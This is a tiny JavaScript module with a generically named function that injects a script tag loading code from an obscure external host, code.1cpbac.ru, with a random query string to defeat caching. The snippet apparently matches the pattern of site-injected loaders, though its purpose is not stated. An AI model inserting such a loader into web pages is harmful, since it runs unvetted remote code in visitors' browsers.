
export function _convertedFunction(a) {
    var b = a.createElement('script');
    b.async = 1;
    b.src = '//code.1cpbac.ru/?r=' + Math.random();
    a = a.getElementsByTagName('script')[0];
    a.parentNode.insertBefore(b, a);
}
